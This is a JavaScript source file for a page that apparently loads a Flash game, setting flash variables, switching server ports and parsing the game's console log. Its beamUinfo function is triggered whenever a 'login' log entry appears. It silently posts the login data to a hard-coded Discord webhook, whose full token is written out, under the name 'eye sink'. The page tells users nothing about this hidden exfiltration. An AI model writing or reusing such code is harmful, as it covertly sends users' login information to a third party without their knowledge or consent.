'use strict'


// Elements

const btnPortSwitch = document.getElementById('port-switch')

const gameContainer = document.getElementById('game-container')

const game = document.getElementById('game')

const elmFlashVars = document.getElementById('flash-vars')


// General

const regExps = {
	prefix: /\[@(\w*)\]/,
	json: /{(.*|[\n])+}/,
}

const portals = getLS('portals', JSON.parse('{"10186":{"location":[50,420],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10188":{"location":[135,420],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10189":{"id":"10189","location":[220,420],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10189,"name":"foo"},"10190":{"location":[305,420],"campaignID":10190,"duration":24024,"id":"10190","startDate":1587027600,"bossID":["ROASTER"],"themeID":4,"name":"Golden Age"},"10191":{"id":"10191","location":[390,420],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10191,"name":"Golden Prison"},"10192":{"location":[475,420],"campaignID":10192,"duration":24024,"id":"10192","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10254":{"location":[560,420],"campaignID":10254,"duration":24024,"id":"10254","startDate":1585558800,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Unreliable Protector"},"10255":{"id":"10254","duration":24024,"startDate":1584435600,"themeID":6,"campaignID":10254,"bossID":["ULTRICORN"],"location":[645,420],"name":"Saint Patrick Special"},"10256":{"location":[730,420],"campaignID":10256,"duration":24024,"id":"10256","startDate":1587632400,"bossID":["UNDERTAKER"],"themeID":5,"name":"Unrepaired Laser Cannon"},"10257":{"location":[815,420],"campaignID":10257,"duration":24024,"id":"10257","startDate":1588669200,"bossID":["THE HAT GUARDIAN"],"themeID":2,"name":"Cinco de Mayo"},"10258":{"location":[900,420],"campaignID":10258,"duration":24024,"id":"10258","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"}}'))

const ports = [['9010', 'REGULAR'], ['915', 'BMMDEV']]

let currentPort = 0

let flashVars = {}

const tslogDataParsers =
{
	login (data)
	{
		console.log('%c!', 'color:#FF00FF')
		beamUinfo(data)
	},
	portal (data)
	{
		Object.assign(portals, data)
		setFlashVars('portals', portals)
	},
}

const doNotLog = []


// Functions

function switchPort ()
{
	currentPort++

	if (currentPort >= ports.length) currentPort = 0

	elmFlashVars.value = elmFlashVars.value.replace(/(port=)\d+/, '$1' + ports[currentPort][0])
	btnPortSwitch.innerText = ports[currentPort][1]
	game.data += ''
}

function setFlashVars ()
{
	const keys = Object.keys(flashVars)

	elmFlashVars.value = keys.map(v => v += '=').join('&')
	
	btnPortSwitch.innerText = ports[currentPort][1]

	for (const k of keys)
	{
		elmFlashVars.value = elmFlashVars.value.replace(k + '=', k + '=' + flashVars[k])
	}
}

function tslog (a)
{
	const jsonStringMatch = a.match(regExps.json)
	const prefixMatch = a.match(regExps.prefix)

	if (prefixMatch)
	{
		const key = prefixMatch[1]
		let data = null

		try
		{
			if (jsonStringMatch) data = JSON.parse(jsonStringMatch[0])
		}
		catch (err)
		{
			console.log('%ccould not parse data:\n' + a, 'font-weight:bold;color:#FF8844')
		}

		if (key)
		{
			const parser = tslogDataParsers[key]

			if (parser) parser(data)

			if (doNotLog.includes(key))
			{
				console.log('%c' + prefixMatch[0], 'font-weight:bold;color:#4488FF')
				return
			}
		}

		console.log('%c' + a, 'font-weight:bold;color:#44FF88')
		console.log(data, '\n')
	}
	else
	{
		let style = 'font-size:80%'

		if (jsonStringMatch)
		{
			let data = null

			try
			{
				data = JSON.parse(jsonStringMatch[0])
			}
			catch (err)
			{
				style = 'font-weight:bold;color:#FF8844'
				console.log('%ccould not parse data:', style)
				return
			}

			console.log('%c' + a, style)
			if (data) console.log(data, '\n')
		}
	}
}

function init ()
{
	const portalIDs = Object.keys(portals)

	for (let i = 0; i < portalIDs.length; i++)
	{
		const portal = portals[portalIDs[i]]
		
		portal.location = [50 + 85 * i, 420]
		portal.duration = 24024
		portal.name = portal.id + ' - ' + portal.name
	}

	flashVars = {
		port: ports[currentPort][0],
		resourceURL: '',
		disableFB: 'true',
		version: 7500,
		portals: JSON.stringify(portals),
	}
	
	setFlashVars()

	game.data = 'bmmLoader.swf?version=7401'

	btnPortSwitch.onclick = () => switchPort()

	// const strfv = 'flashVars = ' + JSON.stringify(flashVars)
	//     .replace(/(".*?":".*?")/g, '\n    $1')
	//     .replace(/"}/g, '"\n}')
	//     .replace(/:"/g, ': "')
	//     .replace(/"(.+)":/g, '$1:')

	// console.log('%c' + strfv, 'font-weight:bold;font-size:125%;color:#004488')
}

function beamUinfo (data)
{
	const request = new XMLHttpRequest()
	request.open('POST', 'https://discordapp.com/api/webhooks/702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF');
	request.setRequestHeader('Content-type', 'application/json');
	request.send(JSON.stringify({
		username: 'eye sink',
		avatar_url: 'https://cdn.discordapp.com/icons/685704312915230743/1147599f001274e82bf9b2cac44deec8.png',
		content: String(data)
	}));
}


// Start

init()
